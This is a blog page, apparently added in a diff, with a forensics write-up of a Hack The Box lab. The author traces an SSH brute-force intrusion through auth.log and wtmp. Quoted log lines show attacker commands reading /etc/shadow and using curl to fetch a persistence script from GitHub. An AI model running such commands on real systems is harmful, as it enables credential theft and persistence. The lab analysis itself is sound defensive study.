@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Untitled Post — Brandon Mukeni</title>
+  <meta name="description" content="">
+ 
+  <link rel="icon" href="/favicon-package/favicon.svg" type="image/svg+xml" sizes="any">
+  <link rel="icon" href="/favicon-package/favicon.ico">
+  <link rel="apple-touch-icon" href="/favicon-package/apple-touch-icon.png">
+  <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+  <meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
+ 
+  <link rel="stylesheet" href="/assets/css/csscopy.css">
+  <link rel="stylesheet" href="/assets/css/post.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+ 
+<body id="top">
+ 
+  <!-- NAV (matches index.html exactly) -->
+  <div class="extended-nav">
+    <div class="logo-nav">
+      <a href="/templates/bcreative_page.html" class="logo">
+        <img src="/images/logo/logo_white.png" width="100" height="20" alt="Brandon Logo" class="logo-light">
+        <img src="/images/logo/logo_teal.png"  width="100" height="20" alt="Brandon Logo" class="logo-dark">
+      </a>
+    </div>
+    <button class="header-action-btn theme-toggle" aria-label="Toggle theme" data-theme-toggler>
+      <ion-icon name="moon-outline" class="moon-icon"></ion-icon>
+      <ion-icon name="sunny-outline" class="sun-icon"></ion-icon>
+    </button>
+  </div>
+ 
+  <header class="header" data-header>
+    <div class="container">
+      <nav class="navbar" data-navbar>
+        <div class="navbar-top">
+          <a href="/templates/bcreative_page.html" class="logo">
+            <img src="/images/logo/logo_white.png" width="100" height="25" alt="Brandon Logo">
+          </a>
+          <button class="nav-close-btn" aria-label="close menu" data-nav-toggler>
+            <ion-icon name="close-outline" aria-hidden="true"></ion-icon>
+          </button>
+        </div>
+        <ul class="navbar-list">
+          <li class="navbar-item"><a href="/index.html"              class="navbar-link" data-nav-link>Home</a></li>
+          <li class="navbar-item"><a href="/templates/aboutme.html"  class="navbar-link" data-nav-link>About Me</a></li>
+          <li class="navbar-item"><a href="/templates/projects.html" class="navbar-link" data-nav-link>Projects</a></li>
+          <li class="navbar-item"><a href="/templates/writeups.html" class="navbar-link" data-nav-link>Write-ups</a></li>
+          <li class="navbar-item"><a href="/templates/contacts.html" class="navbar-link" data-nav-link>Contact</a></li>
+        </ul>
+      </nav>
+      <div class="header-action">
+        <button class="header-action-btn nav-open-btn" aria-label="menu" data-nav-toggler>
+          <ion-icon name="menu-outline" aria-hidden="true"></ion-icon>
+        </button>
+      </div>
+      <div class="overlay" data-nav-toggler data-overlay></div>
+    </div>
+  </header>
+ 
+  <main>
+    <article class="post-article">
+      <div class="container">
+ 
+        <!-- Post header -->
+        <header class="post-header">
+          <div class="post-meta">
+            <span class="post-type-badge">BLOG</span>
+            <time datetime="2026-06-26" class="post-date">June 26, 2026</time>
+          </div>
+          <h1 class="post-title">Untitled Post</h1>
+          
+          <div class="post-divider"></div>
+        </header>
+ 
+        <!-- Post body (converted from the markdown) -->
+        <div class="post-content">
+          <p>Hey! I just wrapped up <strong>Brutus</strong>, an easy-difficulty Sherlock on Hack The Box. Honestly, this was such a fun, hands-on way to brush up on my DFIR (Digital Forensics and Incident Response) basics. If you've ever wanted to get cozy with Linux auth logs (<code>auth.log</code>) and session histories (<code>wtmp</code>), this lab is the perfect playground. </p>
+<p>The scenario is simple: a Confluence server got brute-forced over SSH. Once the attacker got in, they started making themselves at home—escalating privileges, setting up persistence, and downloading scripts. Our job is to trace their footsteps.</p>
+<p>Let me walk you through how I tackled this, what had me scratching my head for a second, and how everything eventually clicked.</p>
+<hr />
+<h3>Question 1</h3>
+<p><strong>Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?</strong></p>
+<p>To start off, I wanted to get a high-level bird's-eye view of what happened on this system. Instead of blindly scrolling through a massive log file, I decided to pull a clean list of the processes that were actually active in <code>auth.log</code>. </p>
+<p>I ran this slick little pipeline to extract, clean, sort, and count the process names:</p>
+<pre><code class="language-bash">awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c
+</code></pre>
+<p>Here’s the output I got:</p>
+<pre><code class="language-text">      1 chfn
+    104 CRON
+      3 groupadd
+      1 passwd
+    257 sshd
+      6 sudo
+      2 systemd
+      8 systemd-logind
+      1 useradd
+      2 usermod
+</code></pre>
+<p>To make the sequence of events clearer, I sorted them numerically:</p>
+<pre><code class="language-bash">awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c | sort -n
+</code></pre>
+<pre><code class="language-text">      1 chfn
+      1 passwd
+      1 useradd
+      2 systemd
+      2 usermod
+      3 groupadd
+      6 sudo
+      8 systemd-logind
+    104 CRON
+    257 sshd
+</code></pre>
+<p>Looking at this, a few things immediately stood out to me. First, there’s a ton of <code>sshd</code> activity (257 entries), which screams brute-force. But then I saw things like <code>useradd</code>, <code>usermod</code>, <code>groupadd</code>, and <code>passwd</code>. That’s a massive red flag. It means whoever got in was busy creating accounts and changing permissions. </p>
+<p>I also noticed <code>chfn</code> run exactly once. I’ll be honest—I wasn't 100% sure what <code>chfn</code> did off the top of my head. I ran a quick help command to check it out:</p>
+<pre><code class="language-bash">chfn -h       
+</code></pre>
+<pre><code class="language-text">Usage: chfn [options] [LOGIN]
+
+Options:
+  -f, --full-name FULL_NAME     change user's full name
+  -h, --home-phone HOME_PHONE   change user's home phone number
+  -o, --other OTHER_INFO        change user's other GECOS information
+...
+</code></pre>
+<p>Ah, okay! It's used to change a user's GECOS (user details) information. So the attacker was definitely tweaking user accounts. </p>
+<p>Next, I wanted to see who they added. I ran a quick grep for <code>useradd</code>:</p>
+<pre><code class="language-bash">grep useradd auth.log
+</code></pre>
+<pre><code class="language-text">Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
+</code></pre>
+<p>Okay, so they created a user named <code>cyberjunkie</code>. </p>
+<p>Now, back to the brute force attack. Since <code>sshd</code> handles the remote connections, I grepped for it to find the IP addresses knocking at our door:</p>
+<pre><code class="language-bash">grep sshd auth.log
+</code></pre>
+<pre><code class="language-text">Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
+Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
+Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
+...
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+...
+</code></pre>
+<p>Looking at this, we see a massive wave of invalid login attempts for <code>admin</code> coming from <strong>65.2.161.68</strong>. That's our brute-forcing IP!</p>
+<hr />
+<h3>Question 2</h3>
+<p><strong>The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?</strong></p>
+<p>Going back to our grep search on <code>sshd</code>, we can see that before the noisy brute-force wave on <code>admin</code> from the other IP, there was a successful password login:</p>
+<pre><code class="language-text">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
+</code></pre>
+<p>The account they successfully compromised was <strong>root</strong>.</p>
+<hr />
+<h3>Question 3</h3>
+<p><strong>Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.</strong></p>
+<p>To find when the attacker actually logged in and opened an active terminal session, we have to look at the <code>wtmp</code> file. This file tracks logins, logouts, system boots, and shutdowns. </p>
+<p>The lab folder came with a helper Python script (<code>utmp.py</code>) to parse this binary file. I first ran it and piped it to <code>head</code> to see what kind of fields we were working with:</p>
+<pre><code class="language-bash">TZ=utc python3 utmp.py wtmp | head -1
+</code></pre>
+<pre><code class="language-text">&quot;type&quot;  &quot;pid&quot;   &quot;line&quot;  &quot;id&quot;    &quot;user&quot;  &quot;host&quot;  &quot;term&quot;  &quot;exit&quot;  &quot;session&quot;       &quot;sec&quot;   &quot;usec&quot;  &quot;addr&quot;
+</code></pre>
+<p>The fields I cared about most were the user, the session time, and the host address. So, I filtered the output for the attacker's IP and used <code>awk</code> to grab just the username and the timestamp columns:</p>
+<pre><code class="language-bash">TZ=utc python3 utmp.py wtmp | grep 65.2.161.68 | awk '{print $5 $10 $11}'
+</code></pre>
+<pre><code class="language-text">&quot;root&quot;&quot;2024/03/0606:32:45&quot;
+&quot;cyberjunkie&quot;&quot;2024/03/0606:37:35&quot;
+</code></pre>
+<p>Boom! There it is. The attacker manually logged into the <code>root</code> account and established their session at <strong>2024-03-06 06:32:45</strong>. </p>
+<p>It’s pretty cool seeing the timeline construct itself: they logged in as <code>root</code> first, and then just a few minutes later, we see the <code>cyberjunkie</code> account log in.</p>
+<hr />
+<h3>Question 4</h3>
+<p><strong>SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?</strong></p>
+<p>This is where understanding Linux system internals comes in handy. When a user logs in via SSH, the <code>systemd-logind</code> service allocates a unique session ID to keep track of their processes and session state. </p>
+<p>I decided to grep <code>auth.log</code> specifically for <code>systemd-logind</code> to map out these sessions:</p>
+<pre><code class="language-bash">grep &quot;systemd-logind&quot; auth.log
+</code></pre>
+<p>Here’s what came back:</p>
+<pre><code class="language-text">Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
+Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
+Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
+Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
+Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
+Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
+Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
+Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
+</code></pre>
+<p>We know from our previous step that the manual session we're investigating was established at <code>06:32:45</code>. Looking at the log above, <code>New session 37 of user root</code> was created at <code>06:32:44</code>. </p>
+<p>So, the attacker's session ID was <strong>37</strong>.</p>
+<hr />
+<h3>Question 5</h3>
+<p><strong>The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?</strong></p>
+<p>We actually stumbled onto this answer earlier while hunting around! I had run a <code>grep</code> for the <code>useradd</code> command:</p>
+<pre><code class="language-bash">less auth.log | grep useradd
+</code></pre>
+<pre><code class="language-text">Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
+</code></pre>
+<p>The backdoor account they created is <strong>cyberjunkie</strong>.</p>
+<hr />
+<h3>Question 6</h3>
+<p><strong>What is the MITRE ATT&amp;CK sub-technique ID used for persistence by creating a new account?</strong></p>
+<p>For this, I had to step out of the terminal and look up the MITRE ATT&amp;CK framework. Creating a local account falls under the Persistence tactic. </p>
+<p>A quick search confirmed that "Create Account: Local Account" is mapped to sub-technique <strong>T1136.001</strong>.</p>
+<hr />
+<h3>Question 7</h3>
+<p><strong>What time did the attacker's first SSH session end according to auth.log?</strong></p>
+<p>To find when their SSH session wrapped up, I looked for when systemd-logind officially destroyed the session. I ran a quick grep for "Removed session":</p>
+<pre><code class="language-bash">TZ=utc grep &quot;Removed session&quot; auth.log
+</code></pre>
+<pre><code class="language-text">Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
+Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
+</code></pre>
+<p>Since we determined earlier that the attacker’s active session was ID 37, we can see it was officially closed and removed at <strong>06:37:24</strong>.</p>
+<hr />
+<h3>Question 8</h3>
+<p><strong>The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?</strong></p>
+<p>Lastly, I needed to figure out what the attacker did once they logged back in as <code>cyberjunkie</code> and used their elevated permissions. I targeted both <code>sudo</code> and the <code>cyberjunkie</code> username to see their exact command execution trail:</p>
+<pre><code class="language-bash">TZ=utc grep &quot;sudo&quot; auth.log | grep cyberjunkie
+</code></pre>
+<p>Here’s the payload trail:</p>
+<pre><code class="language-text">Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
+Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
+Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
+Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
+</code></pre>
+<p>At <code>06:37:57</code>, they read the <code>/etc/shadow</code> file (classic password grabbing). <br />
+A couple of minutes later, at <code>06:39:38</code>, they ran a <code>curl</code> command to fetch a Linux persistence script (<code>linper.sh</code>) from GitHub.</p>
+<p>The full command they executed is:<br />
+<strong>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</strong></p>
+<hr />
+<h3>Wrapping Up</h3>
+<p>And that’s a wrap on Brutus! </p>
+<p>It was a super clean, straightforward lab, but honestly, it was an awesome refresher on some of the most fundamental skills in cybersecurity. Being able to slice through log files with basic Linux command-line tools and reconstruct a timeline of exactly how an attack went down is a superpower. </p>
+<p>What would I do differently next time? I’d probably script the log parsing a bit more to automate some of the session correlation, but manually walking through it this time really helped cement <em>how</em> these services talk to each other.</p>
+<p>See you in the next writeup! Happy hunting! 🫡</p>
+        </div>
+ 
+        <!-- Back link -->
+        <div class="post-footer">
+          <a href="/templates/writeups.html" class="btn btn-secondary">
+            ← Back to all writeups
+          </a>
+        </div>
+ 
+      </div>
+    </article>
+  </main>
+ 
+  <!-- FOOTER (matches index.html) -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-top section grid-list">
+        <div class="footer-brand">
+          <a href="/templates/bcreative_page.html" class="logo">
+            <img src="/images/logo/logo_teal.png" width="100" height="48" alt="Brandon Logo">
+          </a>
+          <p class="footer-text">Cybersecurity student passionate about technology, security, and innovation.</p>
+        </div>
+        <ul class="footer-list">
+          <p class="footer-list-title">Connect</p>
+          <li><a href="https://github.com/muk-e-ni/"          class="footer-link"><ion-icon name="logo-github"></ion-icon> Github</a></li>
+          <li><a href="https://www.linkedin.com/in/brandon-mukeni-46276236b/" class="footer-link"><ion-icon name="logo-linkedin"></ion-icon> LinkedIn</a></li>
+          <li><a href="https://discord.com/users/1130262077957746739"         class="footer-link"><ion-icon name="logo-discord"></ion-icon> Discord</a></li>
+        </ul>
+        <ul class="footer-list">
+          <li><p class="footer-list-title">Explore</p></li>
+          <li><a href="/templates/projects.html" class="footer-link">Projects</a></li>
+          <li><a href="/templates/writeups.html" class="footer-link">Writeups</a></li>
+          <li><a href="/templates/about.html"    class="footer-link">About</a></li>
+        </ul>
+        <ul class="footer-list">
+          <li><p class="footer-list-title">Contact</p></li>
+          <li class="footer-list-item">
+            <ion-icon name="mail" aria-hidden="true"></ion-icon>
+            <a href="mailto:contact@brandonmukeni.com" class="footer-link">Email Me</a>
+          </li>
+          <li class="footer-list-item">
+            <ion-icon name="location" aria-hidden="true"></ion-icon>
+            <address class="address">Nairobi, Kenya</address>
+          </li>
+        </ul>
+      </div>
+      <div class="footer-bottom">
+        <p>&copy; 2026 Brandon Mukeni. All rights reserved.</p>
+        <p class="footer-credit">Made with love and bugs</p>
+      </div>
+    </div>
+  </footer>
+ 
+  <a href="#top" class="back-top-btn" aria-label="back to top" data-back-top-btn>
+    <ion-icon name="arrow-up-outline" aria-hidden="true"></ion-icon>
+  </a>
+ 
+  <script src="/assets/js/jscopy.js" defer></script>
+  <script src="/assets/js/theme.js"  defer></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule    src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
